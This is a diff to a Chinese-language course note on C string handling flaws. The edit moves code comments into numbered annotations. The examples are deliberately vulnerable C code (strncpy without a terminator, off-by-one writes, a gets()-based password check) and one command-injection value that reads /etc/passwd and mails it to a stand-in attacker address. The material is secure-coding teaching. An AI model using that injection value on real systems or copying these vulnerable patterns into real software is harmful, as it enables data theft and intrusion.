@@ -4,8 +4,11 @@
 * 字符串表示法、管理、操作可能导致软件漏洞和漏洞利用
     1. 表示
     	* C-风格字符串"hello"（以`\0`结尾）
+            <figure>
     		![C-风格字符串](md-img/20190923_01.png)
-			- 一个指向字符串的指针实际上就是指向该字符串的起始字符。
+            <figcaption>C-风格字符串</figcaption>
+            </figure>
+            - 一个指向字符串的指针实际上就是指向该字符串的起始字符。
 			- 字符串长度指空字符之前的字节数
 			- 字符串的值则是它所包含的按顺序排列的字符序列。
 			- 存储一个字符串所需要的字节数是字符串的字符数加1。(单位是每个字符的大小)
@@ -75,14 +78,16 @@
 					strncpy(a, "0123456789abcdef", sizeof(a));
 					strncpy(b, "0123456789abcdef", sizeof(b));
 					strncpy(c, a, sizeof(c));
-					//a[]和b[]都没有正确结尾
+					// (1)
 				}
 				```
 
-				!!! info "strncpy函数"
-					`char* strncpy(char* restrict s1, const char* restrict s2, size_t n)`，从数组S2中复制不超过 n 个字符串(空字符后的字符不会被复制)到目标数组`#!c S1*` 中。
+                1. `a[]`和`b[]`都没有正确结尾
 
-                    * 因此，如果第一个数组S2中的前n个字符中不存在空字符，那么其结果字符串将不会是以空字符结尾的
+				!!! info "strncpy函数"
+					`char* strncpy(char* restrict s1, const char* restrict s2, size_t n)`，从数组`S2`中复制不超过 `n` 个字符串(空字符后的字符不会被复制)到目标数组`S1*` 中。
+
+                    * 因此，如果第一个数组S2中的前`n`个字符中不存在空字符，那么其结果字符串将不会是以空字符结尾的
 
 		=== "字符串截断"
 
@@ -116,15 +121,18 @@
 				```c linenums="1" hl_lines="3 5 8"
 				int main(int argc, char* argv[]) {
 					char source[10];
-					strcpy(source, "0123456789");   //空结尾，source只有10字节长
+					strcpy(source, "0123456789");   // (1)
 					char *dest = (char *)malloc(strlen(source));
 					for (int i=1; i <= 11; i++) {
 						dest[i] = source[i];
 					}
-					dest[i] = '\0';      //5~7行的循环后，i最后为12，此行越界写
+					dest[i] = '\0';      // (2)
 					printf("dest = %s", dest);
 				}
 				```
+
+                1. 空结尾，`source`只有10字节长
+                2. 5~7行的循环后，`i`最后为12，此行越界写
 
 		=== "不恰当的数据处理"
 
@@ -132,10 +140,11 @@
 
 				```c
 				/* 应用程序输入一个用户的email 地址，并把地址写入缓冲区  */
-				sprintf(buffer,"/bin/mail %s < /tmp/email",addr);
+				sprintf(buffer,"/bin/mail %s < /tmp/email",addr); // (1)
 				/* 将要使用system()调用执行buffer中的数据 */
-				/* 令addr = "bogus@addr.com; cat /etc/passwd  | mail some@badguy.net"，风险出现（命令注入） */
 				```
+
+                1. 令`addr = "bogus@addr.com; cat /etc/passwd  | mail some@badguy.net"`，风险出现（命令注入）
 
 ## 程序栈
 * 栈存储以下信息：调用函数的返回地址、函数参数、局部 (临时）变量
@@ -191,25 +200,34 @@
 - 以`root`或其他较高权限执行的程序是攻击者的目标
 
 	!!! info "一个利用的例子：源码+利用"
-		```c
+
+        ```c
 		bool IsPasswordOK(void) {
 			 char Password[12];
-			 gets(Password);    // Get input from keyboard
-			 if (!strcmp(Password,"goodpass")) return true; // Password Good
-			 else return false; // Password Invalid
+			 gets(Password);    // (1)
+			 if (!strcmp(Password,"goodpass")) return true; // (2)
+			 else return false; // (3)
 		}
 
 		void main(void) {
-			bool PwStatus;              // Password Status
+			bool PwStatus;              // (4)
 			puts("Enter Password:");
-			PwStatus=IsPasswordOK();    // Get & Check Password
+			PwStatus=IsPasswordOK();    // (5)
 			if (PwStatus == false) {
 				puts("Access denied");
-				exit(-1);              // Terminate Program
+				exit(-1);              // (6)
 			}
 			else puts("Access granted");
 		}
 		```
+
+        1. Get input from keyboard
+        2. Password Good
+        3. Password Invalid
+        4. Password Status
+        5. Get & Check Password
+        6. Terminate Program
+
 		通过构造以下输入，攻击者可以执行任意代码
 
 		```text
@@ -275,47 +293,58 @@
 	=== "SafeStr & XXL"
 		- SafeStr库 & `safestr_t`类型，后者与`char*`兼容
 		- 错误处理：XXL库
-			```c
-			/*一个使用safestr的例子*/
+
+            ```c
+			/* 一个使用safestr的例子 */
 			safestr_t str1;
 			safestr_t str2;
 			XXL_TRY_BEGIN {
-				str1 = safestr_alloc(12, 0);  // (1) 为字符串分配内存空间
+				str1 = safestr_alloc(12, 0);  // (1)
 				str2 = safestr_create("hello, world\n", 0);
-				safestr_copy(&str1, str2);  // (2) 复制字符串
+				safestr_copy(&str1, str2);  // (2)
 				safestr_printf(str1);
 				safestr_printf(str2);
 			}
-			XXL_CATCH (SAFESTR_ERROR_OUT_OF_MEMORY){  // (3) 捕捉内存错误
+			XXL_CATCH (SAFESTR_ERROR_OUT_OF_MEMORY){  // (3)
 				printf("safestr out of memory.\n");
 			}
-			XXL_EXCEPT {   // (4) 处理剩下的异常
+			XXL_EXCEPT {   // (4)
 				printf("string operation failed.\n");
 			}
 			XXL_TRY_END;
 			```
+
+            1. 为字符串分配内存空间
+            2. 复制字符串
+            3. 捕捉内存错误
+            4. 处理剩下的异常
 
 	=== "自建数据结构"
 
 		- `struct string_mx; typedef struct string_mx *string_m;` 不透明的数据类型
 		- 利用状态码返回值
 		- 使用例
-		```c
-		errno_t retValue;
-		char *cstr;  // c style string
-		string_m str1 = NULL;
 
-		if (retValue = strcreate_m(&str1, "hello, world")) {
-		  fprintf(stderr, "Error %d from strcreate_m.\n", retValue);
-		}
-		else { // print string
-		  if (retValue = getstr_m(&cstr, str1)) {
-			fprintf(stderr, "error %d from getstr_m.\n", retValue);
-		  }
-		  printf("%s\n", cstr);
-		  free(cstr); // free duplicate string
-		}
-		```
+            ```c
+    		errno_t retValue;
+    		char *cstr;  // (1)
+    		string_m str1 = NULL;
+
+    		if (retValue = strcreate_m(&str1, "hello, world")) {
+    		  fprintf(stderr, "Error %d from strcreate_m.\n", retValue);
+    		}
+    		else { // (2)
+    		  if (retValue = getstr_m(&cstr, str1)) {
+    			fprintf(stderr, "error %d from getstr_m.\n", retValue);
+    		  }
+    		  printf("%s\n", cstr);
+    		  free(cstr); // (3)
+    		}
+    		```
+
+            1. c-style string
+            2. print string
+            3. free duplicate string
 
 	=== "自己管理动态字符串"
 		- 管理动态字符串
